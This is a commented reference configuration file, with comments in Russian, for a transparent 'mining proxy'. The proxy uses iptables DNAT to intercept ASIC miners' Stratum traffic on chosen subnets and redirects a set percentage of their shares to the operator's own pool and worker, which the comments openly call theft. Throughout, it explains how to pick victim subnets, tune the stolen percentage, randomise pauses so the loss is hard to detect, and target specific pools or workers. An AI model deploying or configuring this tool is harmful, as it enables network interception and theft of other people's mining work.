# ============================================================
# Mining Proxy — эталон конфигурации
# ============================================================
#
# СУТЬ РАБОТЫ
#
#   ASIC ──TCP──▶ iptables DNAT ──▶ mining-proxy ──TCP──▶ реальный пул
#                 (перехват)         (мы тут)              (ASIC ходит сам)
#                                      │
#                                      └─ часть шар ──▶ наш воркер (steal_to)
#
# Прокси не терминирует TLS и не подменяет адрес назначения: реальный адрес
# и порт пула читаются из conntrack (SO_ORIGINAL_DST), поэтому в одной подсети
# ASIC могут майнить на разные пулы, и каждый пойдёт в свой.
#
# КАК ПОЛЬЗОВАТЬСЯ ФАЙЛОМ
#
#   scripts/setup.sh       копирует этот файл в /etc/mining-proxy/config.yaml
#                         (вариант установки через systemd)
#   mining-proxy-start     задаёт вопросы и генерирует config.local.yaml
#                         (локальный вариант, для стенда и разработки)
#
#   ВАЖНО: этот файл — эталон с комментариями, а не рабочий конфиг. Рабочие
#   копии появляются сами (config.local.yaml, /etc/…/config.yaml) и в них
#   комментариев нет. Правьте свои копии, этот эталон держите актуальным.
#
# КАК ЧИТАТЬ ОПИСАНИЯ
#
#   В скобках в строке значения — коротко, за что отвечает параметр.
#   Под строкой — подробный блок с деталями и подводными камнями.
#   Помеченные «НЕ РАБОТАЕТ ВМЕСТЕ» поля взаимноисключающие: заполняется
#   только одно из них, второе программа просто не прочитает.
#
# ЧТО НУЖНО ДЛЯ РАБОТЫ (остальное можно оставить как есть)
#
#   allowed_subnets    подсети ваших ASIC
#   upstream_pool      пул, который используют ASIC (или "" для pass-through)
#   steal_to.pool      ваш пул, если нужна кража
#   steal_to.worker    ваш воркер на нём
# ============================================================


# ════════════════════════════════════════════════════════════════════════════
#  ПЕРЕХВАТ ТРАФИКА (iptables / NAT)
# ════════════════════════════════════════════════════════════════════════════

# Подсети ASIC, трафик которых перенаправляется на прокси
allowed_subnets:                          # (подсети, с которых перехватываем трафик)
  - "10.4.6.0/24"
#
#   ОБЯЗАТЕЛЬНО УКАЖИТЕ СВОИ ПОДСЕТИ, в формате CIDR. Это единственный
#   параметр, без которого перехвата не существует: iptables получит пустой
#   список, не создаст ни одного правила DNAT, и трафик уйдёт мимо прокси
#   прямо в пул. Именно поэтому пустой список при включённом setup_iptables —
#   ошибка при запуске, а не тихий старт.
#
#   Пример для рига: ASIC 10.4.6.30 подключён к eth0 в подсети 10.4.6.0/24.
#   Для двух ригов в разных подсетях перечислите обе:
#     allowed_subnets:
#       - "10.4.6.0/24"
#       - "10.4.7.0/24"
#
#   mining-proxy-start подставляет подсети автоматически по адресам
#   интерфейсов сервера (docker/veth пропускаются) — обычно этого хватает.
#
#   Только TCP. DNS (UDP/53), NTP и DHCP не перехватываются никогда, и это
#   правильно: прокси не умеет их говорить. DNS-майнер нужен лишь для
#   разрешения имени пула, а перехватывается следующий TCP-сеанс к пулу.

# Настраивать iptables автоматически при старте прокси
setup_iptables: true                      # (ставим DNAT-правила сами при запуске)
#
#   true → при каждом старте прокси сам создаёт цепочку MINING_PROXY, пишет
#         правила DNAT, открывает порт в filter/INPUT и включает ip_forward
#         с route_localnet. Требует root. Идемпотентно: повторный запуск
#         пересоздаёт правила, а после SIGKILL следующий старт подчищает
#         оставшиеся. При остановке прокси правила снимаются (fail-open:
#         майнинг не прерывается, трафик идёт в пул напрямую).
#   false → ничего не трогаем, правила настраиваются вручную. Нужен для
#           локального теста: без root iptables вернёт «Permission denied»
#           и прокси не стартует.
#
#   Проверить: curl -s 127.0.0.1:9090/status | grep -A20 '"nat"'
#   Поле "active": true означает, что перехват действительно работает.

# Интерфейсы, с которых приходит трафик ASIC (необязательно, обычно пусто)
nat_ingress_ifaces: []                    # (какие сетевые карты слушать; пусто = авто)
#
#   Пусто (обычно правильно) → интерфейс определяется автоматически: для
#   каждой подсети из allowed_subnets ядро спрашивается «какой интерфейс
#   ведёт к ней» (ip route get). Для типовой схемы «ASIC за eth0» это eth0.
#
#   Задавайте явно ТОЛЬКО если автоматика ошибается: ASIC за туннелем, за
#   OVS или физически на неосновной карте, где маршрут ведёт не туда.
#   Значение перекрывает автоопределение целиком. Несколько интерфейсов:
#     nat_ingress_ifaces: ["eth0", "eth1"]

# Перехватывать весь TCP подсетей или только порт upstream_pool
capture_all_tcp: true                     # (весь TCP подсети, без фильтра по порту)
#
#   true  → DNAT ловит весь TCP от разрешённых подсетей, без фильтра по
#           порту. Нужно, когда клиенты используют разные порты пулов, в том
#           числе «голый» IP:port при DNS-блокировках. Рекомендуется вместе
#           с transparent: true — фильтр по порту там всё равно не нужен,
#           потому что настоящий порт известен из SO_ORIGINAL_DST.
#   false → перехватывается только --dport из upstream_pool. Строже, но
#           ASIC на другом порту (например не на 3333) пройдёт мимо прокси
#           молча, и это трудно заметить.
#
#   НЕ РАБОТАЕТ ВМЕСТЕ: upstream_pool. При capture_all_tcp: true порт из
#   upstream_pool в правила iptables не попадает вовсе.


# ════════════════════════════════════════════════════════════════════════════
#  КУДА ASIC МАЙНИТ
# ════════════════════════════════════════════════════════════════════════════

# Порт прокси, на который iptables перенаправляет трафик ASIC
listen_addr: "0.0.0.0:8443"               # (порт, который слушает прокси после DNAT)
#
#   Это НЕ порт пула. Это адрес, на который DNAT кладёт пакеты и который
#   потом увидит ASIC в connect(). Порт отсюда же попадает в правило ACCEPT
#   в filter/INPUT, поэтому менять его нужно вместе с настройкой iptables.
#
#   0.0.0.0 = слушать на всех интерфейсах (нужно для DNAT с 127.0.0.1).

# Реальный пул, который используют ASIC
upstream_pool: "viabtc.com:3333"          # (пул клиента, куда ASIC шлёт шары)
#
#   Формат host:port, без протокола. Нужен для двух вещей:
#     1) порт из него используется фильтром DNAT, если capture_all_tcp: false;
#     2) fallback-адрес, если SO_ORIGINAL_DST недоступен (прямое подключение
#        к прокси мимо iptables — например с того же сервера).
#
#   ПУСТАЯ СТРОКА = режим pass-through: кража выключена, прокси только
#   прозрачно гонит трафик в настоящий пул каждого клиента. Полезно, чтобы
#   сначала проверить перехват, не включая кражу.
#
#   НЕ РАБОТАЕТ ВМЕСТЕ: пустой steal_to.pool — тоже pass-through (кража
#   выключена). Если не задан хотя бы один из двух адресов, percentage и
#   steal_rules не применяются вообще.

# TLS к upstream_pool
upstream_ssl: false                       # (TLS к пулу клиента; в прозрачном режиме НЕ действует)
#
#   ВНИМАНИЕ, ПОЛЕ ПОЧТИ НЕ РАБОТАЕТ. При transparent: true (рекомендуемый
#   режим) реальный пул клиента берётся из SO_ORIGINAL_DST, и TLS там НЕ
#   терминируется: байты идут от клиента к пулу напрямую через нас. Значение
#   реально применяется только к fallback-соединению, то есть при
#   transparent: false или при прямом подключении к прокси мимо iptables.


# ════════════════════════════════════════════════════════════════════════════
#  КУДА УХОДИТ КРАЖА
# ════════════════════════════════════════════════════════════════════════════

# Целевой пул и воркер для перенаправления шар
steal_to:                                 # (наш пул + воркер — сюда уходит кража)
  pool: "127.0.0.1:3333"                  # (адрес нашего целевого пула)
  #   Наш пул, на который перенаправляются «укушенные» шары. Формат
  #   host:port. Если пусто — кража выключена (pass-through), и тогда
  #   worker/pass/ssl ниже не читаются.

  worker: "my_worker"                     # (воркер на целевом пуле)
  #   Обязателен, если задан pool: без воркера прокси не сможет
  #   авторизоваться на целевом пуле и завершится с ошибкой при старте.

  pass: "x"                               # (пароль воркера)
  #   Пароль от воркера. Большинство пулов принимают "x".

  ssl: false                              # (TLS к целевому пулу)
  #   В отличие от upstream_ssl это поле работает всегда: соединение к краже
  #   устанавливает сам прокси, а не клиент.


# ════════════════════════════════════════════════════════════════════════════
#  СКОЛЬКО И КАК ЧАСТО КРАДЁМ
#
#  НЕ РАБОТАЕТ ВМЕСТЕ: pause_shares и интервалы — два взаимоисключающих
#  режима. При pause_shares: true поля interval_min_hours/max_hours НЕ
#  читаются вообще, при false — не читается логика паузы в шарах. Заполняются
#  только поля, относящиеся к выбранному режиму.
# ════════════════════════════════════════════════════════════════════════════

# Режим паузы: в шарах (true) или по времени (false)
pause_shares: true                        # (true = точный процент; false = пауза по времени)
#
#   true  → «пауза в шарах»: кусаем 1 шару каждые ~100/percentage шар.
#           Процент держится надёжно и НЕ зависит от скорости потока.
#           interval_min/max_hours при этом ПОЛНОСТЬЮ ИГНОРИРУЮТСЯ.
#           Рекомендуется как режим по умолчанию.
#   false → «пауза по времени»: каждая шара участвует в рулетке, но после
#           укуса встаёт пауза [interval_min_hours, interval_max_hours].
#           Фактический процент получается НИЖЕ заявленного, потому что
#           пауза режет поток. Точный процент в этом режиме не гарантирован.

# Минимальная пауза между укусами, часов (только если pause_shares: false)
interval_min_hours: 2                     # (мин. пауза между укусами, часов)
#
#   Случайная пауза выбирается для каждого укуса в диапазоне
#   [interval_min_hours, interval_max_hours]. Значения можно дробными
#   (0.01 = 36 секунд) — удобно для тестов. Нужно, чтобы пул не пересоздавал
#   соединение (иначе сброс хешрейта) и чтобы не забирать шары подряд.
#
#   ИГНОРИРУЕТСЯ при pause_shares: true.

# Максимальная пауза между укусами, часов (только если pause_shares: false)
interval_max_hours: 20                    # (макс. пауза между укусами, часов)
#
#   Верхняя граница того же случайного диапазона. Если min больше max,
#   значения молча меняются местами. Если оба равны — пауза фиксированная.
#
#   ИГНОРИРУЕТСЯ при pause_shares: true.

# Процент шар для перенаправления
percentage: 5.0                           # (какой % шар уходит на наш воркер)
#
#   Диапазон 0.1–100. 5.0 означает: примерно каждая 20-я шара уходит на наш
#   воркер, остальные — в реальный пул как обычно. При pause_shares: true
#   процент достигается точно, при pause_shares: false фактическое значение
#   будет ниже (режет пауза по времени).
#
#   ВАЖНО: оригинал уходит в реальный пул ВСЕГДА, в том числе для украденных
#   шар. То есть ASIC не теряет хешрейт — мы просто дублируем часть шар на
#   свой воркер.

# Таймаут ответа целевого пула на украденную шару, секунд
target_timeout_sec: 30                    # (сколько ждём accept от своего пула)
#
#   Сколько ждать ответа от НАШЕГО пула на перенаправленную шару. Если пул
#   молчит дольше — шара считается потерянной (failover), соединение
#   закрывается, целевой пул перепроверяется. При недоступности целевого
#   пула кража не выполняется вовсе, а оригинал уходит как обычно.


# ════════════════════════════════════════════════════════════════════════════
#  КОГО КРАДЁМ НА ПЛОЩАДКЕ
# ════════════════════════════════════════════════════════════════════════════

# Allowlist пар (пул, воркер). Пусто = кража у всех
steal_rules: []                           # (список пулов/воркеров для кражи)
#
#   Точечный режим: красть не у всех подряд, а только у перечисленных. Если
#   секция задана, всё, чего в ней нет, идёт СКВОЗНЯКОМ — трафик проксируется
#   прозрачно, но без кражи. Если секции нет или она пуста, работает прежнее
#   поведение: кража у всех.
#
#   pool   — реальный адресат соединения (IP:port или host:port). Точную
#           строку удобно скопировать из поля "discovery" в /status.
#           Обязателен, иначе конфиг не загрузится.
#   worker — необязателен. Не указан = красть весь пул. Указан = только
#           этого воркера.
#
#   Процент (percentage) применяется только к совпавшим парам. Пример:
#     steal_rules:
#       - pool: "1.2.3.4:3333"            # красть ВСЕХ воркеров этого пула
#       - pool: "5.6.7.8:3333"
#         worker: "вася3344"              # красть только этого воркера


# ════════════════════════════════════════════════════════════════════════════
#  ПРОЗРАЧНОСТЬ И МОНИТОРИНГ
# ════════════════════════════════════════════════════════════════════════════

# Прозрачный режим: брать реальный адрес назначения из DNAT
transparent: true                         # (реальный адрес пула берём из SO_ORIGINAL_DST)
#
#   true  → настоящий адрес и порт назначения берутся из conntrack
#           (SO_ORIGINAL_DST), а не из одного upstream_pool. Это позволяет
#           ASIC в одной подсети майнить на разные пулы: каждый пойдёт в
#           свой. Весь не-стратум трафик (например TLS без разбора)
#           пропускается прозрачно, байт в байт.
#   false → всё подключение идёт в upstream_pool из конфига. Нужен только
#           для стенда, где ASIC ходит напрямую в прокси, минуя iptables.
#
#   НЕ РАБОТАЕТ ВМЕСТЕ: upstream_ssl. При transparent: true это поле не
#   действует, так как TLS клиента не терминируется.

# Адрес HTTP-мониторинга (/status, /health)
monitor_addr: "127.0.0.1:9090"            # (HTTP-статистика и healthcheck)
#
#   Слушает ТОЛЬКО этот адрес и наружу не отдаётся: в /status видны адреса
#   пулов и воркеров, поэтому выставлять 0.0.0.0 без firewall не стоит.
#   Доступ с другой машины — через SSH-туннель:
#       ssh -L 9090:127.0.0.1:9090 user@server
#
#   ОТКЛЮЧИТЬ ЧЕРЕЗ КОНФИГ НЕЛЬЗЯ: пустое значение заменяется дефолтом
#   127.0.0.1:9090. Если мониторинг не нужен — только правкой кода.
#
#   Что смотреть в /status:
#     nat.active          — работает ли перехват трафика;
#     nat.problems        — конкретная причина, если не работает;
#     stolen_percent      — фактическая доля украденных шар;
#     accepted_percent    — доля принятых целевым пулом.
